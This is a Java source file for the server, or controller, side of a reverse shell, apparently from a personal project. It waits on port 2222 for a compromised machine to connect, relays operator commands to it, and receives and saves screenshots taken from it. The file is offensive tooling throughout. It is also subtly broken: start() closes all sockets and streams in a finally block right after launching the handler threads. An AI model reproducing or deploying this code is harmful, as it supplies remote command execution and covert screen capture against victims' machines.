package obs1d1anc1ph3r.reverseshell.server;

import java.awt.image.BufferedImage;
import java.io.*;
import java.net.*;
import java.text.SimpleDateFormat;
import java.util.Date;
import javax.imageio.ImageIO;

public class ReverseShellServer {

    private static final int SERVER_PORT = 2222;
    private ServerSocket serverSocket;
    private Socket clientSocket;
    private BufferedReader in;
    private PrintWriter out;
    private BufferedReader userInput;
    private DataInputStream dataIn;
    private Thread outputReceiver;
    private Thread inputHandler;

    public static void main(String[] args) {
        ReverseShellServer server = new ReverseShellServer();
        server.start();
    }

    public void start() {
        try {
            setupServer();
            waitForConnection();
            setupStreams();

            outputReceiver = new Thread(new ResponseHandler(in, out));
            outputReceiver.start();

            inputHandler = new Thread(new CommandSender(out, userInput));
            inputHandler.start();

        } catch (IOException e) {
            System.err.println("[ERROR] Server error: " + e.getMessage());
        } finally {
            cleanup();
        }
    }

    private void setupServer() throws IOException {
        serverSocket = new ServerSocket(SERVER_PORT);
        System.out.println("[*] Server is running on port " + SERVER_PORT);
    }

    private void waitForConnection() throws IOException {
        System.out.println("[*] Waiting for incoming connection...");
        clientSocket = serverSocket.accept();
        System.out.println("[+] Connection established with " + clientSocket.getInetAddress());
    }

    private void setupStreams() throws IOException {
        in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
        out = new PrintWriter(clientSocket.getOutputStream(), true);
        userInput = new BufferedReader(new InputStreamReader(System.in));
        dataIn = new DataInputStream(clientSocket.getInputStream());
    }

    public void receiveScreenshot() {
        try {
            System.out.println("[*] Receiving screenshot...");

            int fileSize = dataIn.readInt();
            byte[] imageBytes = new byte[fileSize];
            dataIn.readFully(imageBytes);

            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(imageBytes);
            BufferedImage image = ImageIO.read(byteArrayInputStream);

            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
            File outputFile = new File("screenshot_" + timestamp + ".png");
            ImageIO.write(image, "png", outputFile);
            System.out.println("[+] Screenshot received and saved as " + outputFile.getAbsolutePath());

        } catch (IOException e) {
            System.err.println("[ERROR] Failed to receive screenshot: " + e.getMessage());
        }
    }

    public Socket getClientSocket() {
        return clientSocket;
    }

    private void cleanup() {
        try {
            if (outputReceiver != null && outputReceiver.isAlive()) {
                outputReceiver.interrupt();
            }

            if (inputHandler != null && inputHandler.isAlive()) {
                inputHandler.interrupt();
            }

            if (in != null) {
                in.close();
            }
            if (out != null) {
                out.close();
            }
            if (userInput != null) {
                userInput.close();
            }
            if (dataIn != null) {
                dataIn.close();
            }
            if (clientSocket != null) {
                clientSocket.close();
            }
            if (serverSocket != null) {
                serverSocket.close();
            }

        } catch (IOException e) {
            System.err.println("[ERROR] Error closing resources: " + e.getMessage());
        }
    }
}
